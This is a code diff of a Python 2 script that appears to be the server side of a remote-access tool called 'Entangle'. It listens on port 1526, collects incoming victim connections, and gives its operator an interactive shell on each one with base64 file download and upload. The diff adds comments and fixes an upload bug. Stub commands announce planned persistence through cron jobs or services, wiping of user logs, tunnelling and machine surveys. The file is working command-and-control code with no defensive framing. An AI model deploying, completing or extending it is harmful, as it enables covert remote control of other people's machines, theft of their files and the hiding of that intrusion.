@@ -1,16 +1,19 @@
 import socket
 import json
-import os
 import threading
 import base64
 
 
-def shell(target,ip):
+def shell(target, ip):
+    """Managing the shell commands. This function contains 2 additional functions called send and receive"""
+
     def send(data):
+        """Responsible for sending data"""
         json_data = json.dumps(data)
         target.send(json_data)
 
     def receive():
+        """Responsible for receiving data"""
         data = ""
         while True:
             try:
@@ -22,46 +25,42 @@ def shell(target,ip):
     global count
 
     while True:
-        command = raw_input("Session~# " )
-        send(command)
-        if command == "":
+        command_input = raw_input("Session~# ")  # How to interact with the shell
+        send(command_input)
+        if command_input == "":  # will not hang if nothing is entered and user press enter. Probably will change it to show all commands possible
             continue
 
-        elif command == 'detach':
+        elif command_input == 'detach':  # detach from session but not close connection
             break
 
-        elif command == "quit":
+        elif command_input == "quit":  # close connection
             target.close()
             targets.remove(target)
             ips.remove(ip)
             break
 
-        elif command[:8] == "download":
-            with open(command[9:], "wb") as file:
+        elif command_input[:8] == "download":  # download file. will be using b64
+            with open(command_input[9:], "wb") as file:
                 file_data = receive()
                 file.write(base64.b64decode(file_data))
 
-        elif command[:6] == "upload":
-            with open(command[7:], "rb") as uload:
-                send(base64.b64encode(uload.read(uload.read())))
+        elif command_input[:6] == "upload":  # upload file. will be using b64
+            with open(command_input[7:], "rb") as uload:
+                send(base64.b64encode(uload.read()))
 
-
-        elif command == "unset":
+        elif command_input == "persist":  # will attempt to persist payload via cronjob or service
             pass
 
-        elif command == "persist":
+        elif command_input == "clean":  # will attempt to clean all user logs (Probably will not get everything)
             pass
 
-        elif command == "clean":
+        elif command_input == "ftunnel":  # Attempt to make a forward tunnel
             pass
 
-        elif command == "tunnel":
+        elif command_input == "survey":  # will do a basic survey of the machine
             pass
 
-        elif command == "survey":
-            pass
-
-        elif command[:2] == "cd" and len(command) > 1:
+        elif command_input[:2] == "cd" and len(command_input) > 1:  # change directory
             continue
         else:
             result = receive()
@@ -69,17 +68,18 @@ def shell(target,ip):
 
 
 def server():
+    """Managing the Server"""
     global clients
     while True:
         if stop_threads:
             break
-        #s.settimeout(1)
+        # s.settimeout(1) # if enabled , I get an error trying to run commands
         try:
             target, ip = s.accept()
             targets.append(target)
             ips.append(ip)
             print ("**** " + ip[0] + " Has Connected ****")
-            #print(str(ips[clients]) + " Has Connected!")
+            # print(str(ips[clients]) + " Has Connected!")
             clients += 1
         except:
             pass
@@ -90,35 +90,35 @@ ips = []
 targets = []
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-s.bind(("0.0.0.0", 1526))
+s.bind(("0.0.0.0", 1526))  # server bind.  TODO. will make these arguments variables
 s.listen(5)
 
-clients = 0
+clients = 0  # client count
 stop_threads = False
 
 print("Waiting for connections ....")
 
-t1 = threading.Thread(target=server)
+t1 = threading.Thread(target=server)  # allowing for multiple threads of the server
 t1.start()
 
 while True:
-    command = raw_input("Entangle: ")
-    if command == "show":
-       count = 0
-       for ip in ips:
-           print ("Session " + str(count) + " ----> " + str(ip))
-           count +=1
+    command = raw_input("Entangle: ")  # How to interact with the application
+    if command == "list":  # show a list of all active connections
+        count = 0
+        for ip in ips:
+            print ("Session " + str(count) + " ----> " + str(ip))
+            count += 1
 
-    elif command[:7] == "session":
+    elif command[:7] == "session":  # switch between different sessions
         try:
             num = int(command[8:])
             tarnum = targets[num]
             tarip = ips[num]
-            shell(tarnum,tarip)
+            shell(tarnum, tarip)
         except:
             print("Session not %s Found!" % num)
             continue
-    elif command == "exit":
+    elif command == "exit":  # Close server
         for target in targets:
             target.close()
         s.close()
